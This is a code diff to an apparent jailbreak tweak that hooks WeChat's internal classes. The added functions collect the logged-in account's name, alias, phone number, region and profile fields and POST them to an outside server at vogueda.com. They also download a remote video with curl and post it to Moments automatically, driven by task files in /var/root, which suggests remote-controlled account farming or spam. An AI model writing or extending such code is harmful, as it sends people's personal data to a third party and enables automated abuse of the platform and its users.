@@ -47,6 +47,44 @@ extern "C" BOOL write2File(NSString *fileName, NSString *content) {
     return YES;
 }
 
+//发送个人信息
+extern "C" void upLoadWxPersonal(NSString *data){
+
+    //读出任务ID和orderID
+    NSMutableDictionary *taskId = openFile(@"/var/root/als.json");
+    NSLog(@"HKWeChat loadTaskId:%@",taskId);
+
+    NSString *urlStr = [NSString stringWithFormat:@"http://www.vogueda.com/shareplatformWxTest/weixin/upLoadWxPersonal.htm"];
+    //把传进来的URL字符串转变为URL地址
+    NSURL *url = [NSURL URLWithString:urlStr];
+
+    //请求初始化，可以在这针对缓存，超时做出一些设置
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url
+                                                           cachePolicy:NSURLRequestReloadIgnoringCacheData
+                                                       timeoutInterval:20];
+
+    NSString *parseParamsResult = [NSString stringWithFormat:@"encodeType=1&taskId=%@&dataList=[%@]&selfWeixinAlias=%@",[taskId objectForKey:@"taskId"],data,[m_nCSetting m_nsUsrName]];
+
+    NSLog(@"HKWeChat 发送成功给服务器 %@",parseParamsResult);
+
+    NSData *postData = [parseParamsResult dataUsingEncoding:NSUTF8StringEncoding];
+
+    [request setHTTPMethod:@"POST"];
+    [request setHTTPBody:postData];
+
+
+    // 3. Connection
+    [NSURLConnection sendAsynchronousRequest:request queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {
+
+        if (connectionError == nil) {
+
+            NSString *aString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+
+            NSLog(@"HKWeChat 发送成功给服务器 %@ 服务器返回值为:%@",url,aString);
+        }
+    }];
+
+}
 
 //发送同步信息
 extern "C" void syncContactTask(NSString *data,int isLast){
@@ -339,6 +377,144 @@ static BOOL m_is_kickQuit = NO;  //判断当前是否执行修改头像
 
 
 %hook NewMainFrameViewController
+
+%new
+- (void)getWxPersonal{
+
+    //上传个人信息
+    dispatch_group_async(group, queue, ^{
+
+        [NSThread sleepForTimeInterval:2];
+        //得到通讯录的信息
+        FTSContactMgr *ftsContactMgr = [[[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:NSClassFromString(@"FTSFacade")] ftsContactMgr];
+
+        [ftsContactMgr tryLoadContacts];
+
+        NSMutableDictionary *dicContact = [ftsContactMgr getContactDictionary];
+
+        NSArray *keys = [dicContact allKeys];
+        
+        NSString *dataJson = @"";
+        //上传服务器
+        for(int i=0; i<[keys count];i++){
+
+            CContact *ccontact = [dicContact objectForKey:keys[i]];
+            if([ccontact isMyContact] && [[ccontact m_nsAliasName] isEqualToString:[m_nCSetting m_nsAliasName]]){
+                
+                NSString *nickname = conversionSpecialCharacter([ccontact m_nsNickName]);
+                NSString *nsRemark = conversionSpecialCharacter([ccontact m_nsRemark]);
+                NSString *nsCountry = conversionSpecialCharacter([ccontact m_nsCountry]);
+                NSString *nsProvince = conversionSpecialCharacter([ccontact m_nsProvince]);
+                NSString *nsCity = conversionSpecialCharacter([ccontact m_nsCity]);
+
+                dataJson = [NSString stringWithFormat:@"{\"nsUsrName\":\"%@\",\"nsAliasName\":\"%@\",\"nsNickName\":\"%@\",\"phoneNumber\":\"%@\",\"nsCountry\":\"%@\",\"nsProvince\":\"%@\",\"nsCity\":\"%@\",\"uiSex\":\"%lu\",\"nsRemark\":\"%@\",\"nsEncodeUserName\":\"%@\",\"nsHeadImgUrl\":\"%@\",\"nsSignature\":\"%@\"}",[ccontact m_nsUsrName],[ccontact m_nsAliasName],nickname,[m_nCSetting m_nsMobile],nsCountry,nsProvince,nsCity,[ccontact m_uiSex],nsRemark,[ccontact m_nsEncodeUserName],[ccontact m_nsHeadImgUrl],[ccontact m_nsSignature]];
+
+                break;
+            }
+        }
+
+        upLoadWxPersonal(dataJson);
+    });
+
+}
+
+
+%new
+-(BOOL)downFileByUrl:(NSString *)downUrl dwonName:(NSString *)dwonName{
+
+    NSLog(@"hkfodderWeixin is Down file %@ ",dwonName);
+
+    NSString *url = downUrl;
+    if([url isEqualToString:@""] || url == nil){
+        NSLog(@"hkfodderWeixin downURL is null hkfodderWeixin下载的文件名为空,下载失败");
+
+        return NO;
+    }
+
+    CURL *downDylib = curl_easy_init();
+    FILE *fp;
+    CURLcode imgresult;
+
+    fp = fopen([dwonName UTF8String], "wb");
+    if (downDylib) {
+        if( fp == NULL ) {
+            NSLog(@"hkfodderWeixin-curl image failed: %@", @"File cannot be opened.下载失败");
+
+            return NO;
+        }
+        curl_easy_setopt(downDylib, CURLOPT_URL, [url UTF8String]);
+        curl_easy_setopt(downDylib, CURLOPT_WRITEFUNCTION, NULL);
+        curl_easy_setopt(downDylib, CURLOPT_WRITEDATA, fp);
+
+        imgresult = curl_easy_perform(downDylib);
+        if( imgresult ){
+            NSLog(@"hkfodderWeixin-curl Cannot grab the image!.下载失败\n");
+
+            return NO;
+        }
+    }
+
+    fclose(fp);
+    
+    curl_easy_cleanup(downDylib);
+    
+    return YES;
+    
+}
+
+//朋友圈发视频
+%new
+-(void)sendRegFriendsVideo{
+    //读取数据
+    NSMutableDictionary *videoInfo = openFile(@"/var/root/als.json");
+    if([[videoInfo objectForKey:@"videoUrl"] isEqualToString:@""] || [videoInfo objectForKey:@"videoUrl"] == nil){
+        NSLog(@"当然videoUrl为空");
+        return;
+    }
+
+    if([[videoInfo objectForKey:@"videoName"] isEqualToString:@""] || [videoInfo objectForKey:@"videoName"] == nil){
+        NSLog(@"当然videoName为空");
+        return;
+    }
+
+    //判断当前文件是否存在
+    NSString *videoPath = [NSString stringWithFormat:@"/var/root/hkreg/%@",[videoInfo objectForKey:@"videoName"]];
+    NSString *videoImg = [videoInfo objectForKey:@"videoImg"];
+
+    BOOL downSuccess = NO;
+
+    if([[NSFileManager defaultManager] fileExistsAtPath:videoPath]){
+        downSuccess = YES;
+        //存在
+        NSLog(@"hkfodderWeixin is exist,朋友圈发视频当前视频已经存在 视频的名字为:%@",videoPath);
+    }else{
+        //不存在进行下载
+        NSLog(@"朋友圈发视频当前视频不存在，进行下载视频,开始下载视频 视频名字为:%@ 视频链接为：%@",videoPath,[videoInfo objectForKey:@"videoUrl"]);
+        //下载视频
+        downSuccess = [self downFileByUrl:[videoInfo objectForKey:@"videoUrl"] dwonName:videoPath];
+    }
+
+    if(!downSuccess){
+        NSLog(@"发朋友圈视频时下载视频失败 视频名字为:%@ 视频链接为：%@", videoPath,[videoInfo objectForKey:@"videoUrl"]);
+        return;
+    }
+
+    //下载文件
+    NSString *text = [videoInfo objectForKey:@"taskTextContent"];
+    UIImage *realThumb = [[UIImage alloc] initWithData:[[NSData alloc] initWithContentsOfURL:[NSURL URLWithString:videoImg]]];
+    id vc = [[NSClassFromString(@"SightMomentEditViewController") alloc] init];
+    id textView = [[NSClassFromString(@"MMGrowTextView") alloc] init];
+    [vc setRealMoviePath:videoPath];
+    [vc setMoviePath:videoPath];
+    [vc setRealThumbImage:realThumb];
+    [vc setThumbImage:realThumb];
+    Ivar ivar = class_getInstanceVariable([vc class], "_textView");
+    [textView setText:text];
+    object_setIvar(vc, ivar, textView);
+    [vc uploadMoment];
+    NSLog(@"执行成功");
+}
+
 - (void)viewDidAppear:(_Bool)arg1{
     %orig;
 
@@ -362,6 +538,12 @@ static BOOL m_is_kickQuit = NO;  //判断当前是否执行修改头像
             NSString *isRealPath = [bufferFilePath substringToIndex:(bufferFilePath.length -14)];
             write2File(@"/var/root/hkreg/bufferFilePath.txt",isRealPath);
             NSLog(@"bufferFilePath:%@ isRealPath:%@",bufferFilePath,isRealPath);
+        }else if([isAccount isEqualToString:@"2"]){
+            //上传个人数据
+            [self getWxPersonal];
+        }else if([isAccount isEqualToString:@"3"]){
+            //发送朋友圈视频
+            [self sendRegFriendsVideo];
         }
 
         dispatch_async(dispatch_get_main_queue(), ^{
@@ -655,6 +837,7 @@ static BOOL m_is_kickQuit = NO;  //判断当前是否执行修改头像
 
     NSLog(@"HKWeChat ContactsViewController(进入通讯录)");
 
+
     //判断当前是否要同步通讯录,判断als.json是否有木有数据
     NSMutableDictionary *taskId = openFile(@"/var/root/als.json");
     if([[taskId objectForKey:@"taskId"] isEqualToString:@""] || [taskId objectForKey:@"taskId"] == nil){
@@ -662,6 +845,10 @@ static BOOL m_is_kickQuit = NO;  //判断当前是否执行修改头像
         NSLog(@"当然taskid为空,不同步通讯录");
         return;
     }
+
+    NSString *isAccount = readFileData(@"/var/root/hkreg/accountStorageMgr.txt");
+
+    if([isAccount isEqualToString:@"2"]){
 
     NSLog(@"HKWeChat %@",[taskId objectForKey:@"taskId"]);
 
@@ -744,6 +931,8 @@ static BOOL m_is_kickQuit = NO;  //判断当前是否执行修改头像
         });
     });
 
+
+    }
     
 }
 
